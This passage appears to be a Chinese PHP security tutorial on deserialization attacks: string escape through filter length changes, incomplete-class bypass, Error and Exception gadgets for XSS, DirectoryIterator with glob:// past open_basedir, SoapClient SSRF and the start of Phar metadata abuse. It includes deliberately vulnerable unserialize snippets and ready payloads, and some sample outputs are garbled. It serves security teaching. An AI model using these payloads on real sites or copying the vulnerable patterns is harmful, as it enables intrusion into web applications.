<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$str</span></span>)</span>{</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">"x"</span>,<span class="string">"xx"</span>,<span class="variable">$str</span>);</span><br><span class="line">}</span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_GET</span>[<span class="string">'name'</span>];</span><br><span class="line"><span class="variable">$age</span> = <span class="string">"I am 11"</span>;</span><br><span class="line"><span class="variable">$arr</span> = <span class="keyword">array</span>(<span class="variable">$name</span>,<span class="variable">$age</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"反序列化字符串："</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"过滤后:"</span>;</span><br><span class="line"><span class="variable">$old</span> = <span class="title function_ invoke__">change</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>));</span><br><span class="line"><span class="variable">$new</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$old</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$new</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br/&gt;此时age=<span class="subst">$new</span>[1]"</span>;</span><br></pre></td></tr></tbody></table></figure>


<p>正常情况,传入<code>name=mao</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串: string(38)"a:2:{i:0;s:3:"mao";i:1;s:7:"I am 11";}"</span><br><span class="line">过滤后:array(2){[0]=&gt; string(3)"mao"[1]=&gt;string(7) "I am 11"}</span><br><span class="line">此时，age=I am 11</span><br></pre></td></tr></tbody></table></figure>

<p>如果此时多传入一个x，反序列化失败，由于溢出(s本来是4，多了一个字符出来)，我们可以利用这一点实现字符串逃逸。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串: string(39) "a:2:{i:O;s:4:"maox";i:1;s:7:"I am 11";}"</span><br><span class="line">过滤后:bool(false)</span><br><span class="line">此时，age=</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串:string(79)"a:2:0i:0;s:43:"maoxxxxxx00x0xxoxxxxx";i:1;s:6:"woaini7";}";i:1;s:7:"l am 11";)"</span><br><span class="line">过滤后:array(2){[0]=&gt;string(43)"maoxxx808x88x883800x80000008xxxxxxxxxx”[1]=&gt; string(6)"woaini"})</span><br><span class="line">此时，age=woaini</span><br></pre></td></tr></tbody></table></figure>



<p>传入</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=maoxxxxxxxxxxxxxxxxxxxx";i:1;s:6:"woaini";}</span><br><span class="line">";i:1;s:6:"woaini";}</span><br></pre></td></tr></tbody></table></figure>

<p>这一部分一共二十个字符，由于一个x会被替换为两个，一共输入了20个x，现在是40个，多出来的20个x取代了这二十个字符<code>";i:1;s:6:"woaini";}</code>，从而造成<code>";i:1;s:6:"woaini";}</code>的溢出，而<code>"</code>闭合了前串，使字符串成功逃逸，可以被反序列化，输出<code>woaini</code>。<br>最后的<code>;}</code>闭合反序列化全过程导致原来的<code>";i:1;s:7:"I am 11";}"</code>被舍弃，不影响反序列化过程</p>
<h5 id="情况2：过滤后字符变少"><a href="#情况2：过滤后字符变少" class="headerlink" title="情况2：过滤后字符变少"></a>情况2：过滤后字符变少</h5><p>把反序列化后的两个x替换成为一个</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str){</span><br><span class="line">    return str_replace("xx","x",$str);</span><br><span class="line">}</span><br><span class="line">$arr['name'] = $_GET['name'];</span><br><span class="line">$arr['age'] = $_GET['age'];</span><br><span class="line">echo "反序列化字符串：";</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo "&lt;br/&gt;";</span><br><span class="line">echo "过滤后:";</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo "&lt;br/&gt;";</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo "&lt;br/&gt;此时，age=";</span><br><span class="line">echo $new['age'];</span><br></pre></td></tr></tbody></table></figure>

<p><code>正常情况传入name=mao&amp;age=11</code></p>
<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串:string(46)"a:2:{s:4:"name";s:3:"mao";s:3:"age";s:2:"11"";)"</span><br><span class="line">过滤后:string(46)"a:2:{s:4:"name";s:3:"mao";s:3:"age";s:2:"11";}”</span><br><span class="line">array(2){["name"]=&gt;string(3)"mao"["age"]=&gt;string(2)"11"}</span><br><span class="line">此时,age=11</span><br></pre></td></tr></tbody></table></figure>

<p>前面少了一半，导致后面的字符覆盖，从而执行了后面的代码；<br>这部分是age序列化后的结果</p>
<p><code>s:3:"age";s:28:"11";s:3:"age";s:6:"woaini";}"</code></p>
<p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>";s:3:"age";s:28:"11</code>这一部分刚好20个，后面由于有<code>"</code>闭合了前面因此后面的参数就可以由我们自定义执行了</p>
<h4 id="利用不完整类绕过序列化"><a href="#利用不完整类绕过序列化" class="headerlink" title="利用不完整类绕过序列化"></a>利用不完整类绕过序列化</h4><p>当存在 <code>serialize(unserialize($x)) != $x</code> 时, 可以利用不完整类 <code>__PHP_Incomplete_Class</code> 来进行处理。</p>
<p>当我们尝试反序列化到一个不存在的类时, PHP 会使用 <code>__PHP_Incomplete_Class_Name</code> 这个追加的字段来进行存储。我们于是可以尝试自己构造一个不完整类</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = <span class="string">'O:1:"A":2:{s:1:"a";s:1:"b";s:27:"__PHP_Incomplete_Class_Name";s:1:"F";}'</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">'O:1:"F":1:{s:1:"a";s:1:"b";}'</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$raw</span>)) == <span class="variable">$exp</span>); <span class="comment">// true</span></span><br></pre></td></tr></tbody></table></figure>

<p>绕过。</p>
<p>更进一步, 我们可以通过这个让一个对象被调用后凭空消失, 只需要手动构造无<code>__PHP_Incomplete_Class_Name</code>的不完整对象</p>
<p>PHP 会先把他的属性给创建好, 但是在创建好最后一个属性后并未发现 <code>__PHP_Incomplete_Class_Name</code>, 于是会将前面创建的所有的属性回收并引发 <code>__destruct</code>。</p>
<h2 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h2><h3 id="原生类反序列化利用"><a href="#原生类反序列化利用" class="headerlink" title="原生类反序列化利用*"></a>原生类反序列化利用*</h3><h4 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h4><p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。</p>
<p>如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，也可以直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p>
<h6 id="类摘要"><a href="#类摘要" class="headerlink" title="类摘要"></a><strong>类摘要</strong></h6><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> {</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">""</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h6 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a><strong>类属性</strong></h6><ul>
<li>message：错误消息内容</li>
<li>code：错误代码</li>
<li>file：抛出错误的文件名</li>
<li>line：抛出错误在该文件中的行数</li>
</ul>
<h6 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a><strong>类方法</strong></h6><ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li>
</ul>
<h6 id="使用-Error-内置类构造XSS"><a href="#使用-Error-内置类构造XSS" class="headerlink" title="使用 Error 内置类构造XSS"></a>使用 Error 内置类构造XSS</h6><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'whoami'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<p>//一个反序列化函数，但是没有进行反序列化的类，反序列化但没有POP链的情况只能找到PHP内置类来进行反序列化</p>
<h6 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h6><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h4><h6 id="类摘要-1"><a href="#类摘要-1" class="headerlink" title="类摘要"></a><strong>类摘要</strong></h6><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Exception {</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = "" , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<h6 id="类属性-1"><a href="#类属性-1" class="headerlink" title="类属性"></a><strong>类属性</strong></h6><ul>
<li>message：异常消息内容</li>
<li>code：异常代码</li>
<li>file：抛出异常的文件名</li>
<li>line：抛出异常在该文件中的行号</li>
</ul>
<h6 id="类方法-1"><a href="#类方法-1" class="headerlink" title="类方法"></a><strong>类方法</strong></h6><ul>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li>
<li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li>
</ul>
<h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">'whoami'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure>

<h6 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h6><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">"&lt;script&gt;alert('xss')&lt;/script&gt;"</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h4><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。DirectoryIterator与glob://协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p>
<h6 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h6><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">'whoami'</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>){</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">'&lt;br&gt;'</span>);</span><br><span class="line">}</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">"glob:///*"</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>){<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">'&lt;br&gt;'</span>);}</span><br></pre></td></tr></tbody></table></figure>

<p>输入 <code>/?whoami=glob:///*</code> 可列出根目录下的文件。</p>
<p>只能列根目录和open_basedir指定的目录的文件，不能列出其他目录中的文件，且不能读取文件内容。</p>
<h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p><code>php</code>在安装<code>php-soap</code>拓展后，可以反序列化原生类<code>SoapClient</code>，来发送<code>http post</code>请求。</p>
<p><code>SoapClient</code> 可以进行 <code>HTTP/HTTPS</code> 的请求, 但是不会输出服务端输出的内容. 不过, 我们仍然可以利用这个来进行内网渗透。</p>
<p>我们通过上面的脚本可以找到 <code>SoapClient</code> 类中存在 <code>SoapClient::__call</code>, 当我们调用一个不存在的方法时会转发到此方法, 同时请求给服务端</p>
<p>对于 <code>SoapClient</code> 的反序列化, 我们可以控制很多地方的参数,</p>
<ul>
<li><code>location</code> (<code>SoapClientlocation</code>),这样就可以发送请求到指定服务器</li>
<li><code>uri</code> (<code>SoapClienturi</code>), 由于这一串最后会到 Header 里的 <code>SOAPAction</code>, 我们可以在这里注入换行来新建 Header 项, 注意这里的会自动给传入的内容包裹上双引号</li>
<li><code>useragent</code> (<code>SoapClient_user_agent</code>), 由于 <code>User-Agent</code> 段在 <code>Content-Type</code> 的上方, 我们可以通过对 <code>useragent</code> 换行来覆盖掉默认的 <code>text/xml</code> 的请求类型. 由于默认是 POST 请求, 结合起来我们就可以对指定服务器发送任意 POST 请求。</li>
</ul>
<h3 id="Phar-反序列化"><a href="#Phar-反序列化" class="headerlink" title="Phar 反序列化"></a>Phar 反序列化</h3><h4 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a><code>phar</code>文件</h4><p><code>phar</code>文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的<code>meta-data</code>。当受影响的文件操作函数调用<code>phar</code>文件时，会自动反序列化<code>meta-data</code>内的内容。</p>
<p>在软件中，<code>PHAR</code>（<code>PHP</code>归档）文件是一种打包格式，通过将许多<code>PHP</code>代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如<code>fopen()</code>,<code>copy()</code>,<code>file_exists()</code>和<code>filesize()</code>。 <code>phar://</code>就是一种内置的流包装器。</p>
<h4 id="常见的流包装器"><a href="#常见的流包装器" class="headerlink" title="常见的流包装器"></a>常见的流包装器</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></tbody></table></figure>

<h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stub:phar文件的标志，必须以 xxx <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span> 结尾，否则无法识别。xxx可以为自定义内容。</span><br><span class="line">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span><br><span class="line">content:被压缩文件的内容</span><br><span class="line"><span class="title function_ invoke__">signature</span>(可空):签名，放在末尾。</span><br></pre></td></tr></tbody></table></figure>

<h4 id="生成一个phar文件"><a href="#生成一个phar文件" class="headerlink" title="生成一个phar文件"></a>生成一个phar文件</h4><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>{</span><br><span class="line">    }</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">"phar.phar"</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">"phar.phar"</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ 